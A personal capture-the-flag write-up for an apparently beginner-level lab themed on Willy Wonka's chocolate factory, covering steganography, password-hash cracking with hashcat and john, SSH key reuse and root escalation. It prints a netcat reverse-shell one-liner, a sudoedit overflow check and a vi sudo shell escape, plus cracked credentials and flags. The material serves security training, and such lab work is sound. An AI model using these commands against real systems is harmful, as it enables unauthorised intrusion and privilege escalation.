**Welcome to Willy Wonka's Chocolate Factory!**

![](https://i.pinimg.com/originals/01/86/9e/01869e0b2238d8307020d2c4503cec51.jpg)

This room was designed so that hackers can revisit the Willy Wonka's Chocolate Factory and meet Oompa Loompa

This is a beginner friendly room!

---

_Enter the key you found!



_What is Charlie's password?



_Change user to charlie



_Enter the user flag



_Enter the root flag

---

## Enum 

![[Pasted image 20240713085213.png]]

When i try to login it takes me to a verification.php script. Maybe i can do something with this later.

**Wappalyzer**

![[Pasted image 20240713090530.png]]

P-113 reveals a secret.
http://localhost/key_rev_key <- You will find the key here!!!

I use strings on the file and pipe it to less:
![[Pasted image 20240713093426.png]]

Congratulations you have found the key:   
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='

I run file to see what it is:
![[Pasted image 20240713093851.png]]

I give it execute permissions and use the key i found.
- It requires a name. I tried charlie but it didn't work. 

Back to the jpg image:

```php
steghide --info gum_room.jpg
```

```php
steghide extract -sf gum_room.jpg
```

For some reason the pass didn't work but stegseek already extracted the file. I copy it to a txt document and then use base64 -d to decode it.

```php
cat b64.txt | base64 -d
```

This sumps a password file and hashes.

I now have charlie hash ready for cracking:
`charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::`

This looks like md5 so i'll use hashcat for this.

I look up the hash on the website: https://hashcat.net/wiki/doku.php?id=example_hashes

Then use hashcat on the file:

```php
hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

We could also use john.

```php
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![[Pasted image 20240713101312.png]]
cn7824           (charlie)

![[Pasted image 20240713101610.png]]

I look around for a while and then launch a rev shell:

```php
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f
```

## Priv

Available information:                                                                                                                                                                            
Kernel version: 4.15.0                                                                                                                        Architecture: x86_64                                                                                                                        Distribution: ubuntu                                                                                                                          Distribution version: 18.04                                                                                                               Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed                  Package listing: from current OS       

Les has a sudo baron listed so we check to see if vulnverable:

```php
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

![[Pasted image 20240713103740.png]]

╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                                                          
uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root),27==(sudo)==                    
╔══════════╣ Do I have PGP keys?                                                                                                                                                                  
/usr/bin/gpg                                                                                                                                      netpgpkeys Not Found                                                                                                                     netpgp Not Found                                                                                                                                                                                  
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d                                                                                                                                 
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                  
/etc/sudoers:Defaults   env_reset                                                                                                    /etc/sudoers:Defaults   mail_badpa==ss==                                                                                             /etc/sudoers:Defaults   secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"                    /etc/sudoers:root       ALL=(ALL:ALL) ALL                                                                                      /etc/sudoers:charlie ALL=(ALL:!root) NOPASSWD:/usr/bin/==vi==                                                       /etc/sudoers:%admin ALL=(ALL) ALL                                                                                             Sudoers file: /etc/sudoers.d/99-snapd.conf is readable                                                               Defaults    secure_path += /snap/bin                          

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:==sudo==;unix-group:admin

---

I check out Charlies home dir:

![[Pasted image 20240713110122.png]]

We may be able to ssh as charlie into the machine.

```php
chmod 600 id_rsa
```

```php
ssh -i id_rsa charlie@10.10.142.138
```

![[Pasted image 20240713110520.png]]

flag{cd5509042371b34e4826e4838b522d2e}

---

## Root Escalation 

We already spotted this earlier so we get the script from GTFObins

```php
sudo vi -c ':!/bin/sh' /dev/null
```

![[Pasted image 20240713111106.png]]

![[Pasted image 20240713112420.png]]

Contained the message from the nmap scans:  /etc/init.d/chocolate.txt 

![[Pasted image 20240713113041.png]]

Finally i get to use the key i found right at the start:

![[Pasted image 20240713113142.png]]
Very cool. One of the best boxes yet. 

**flag{cec59161d338fef787fcb4e296b42124}**






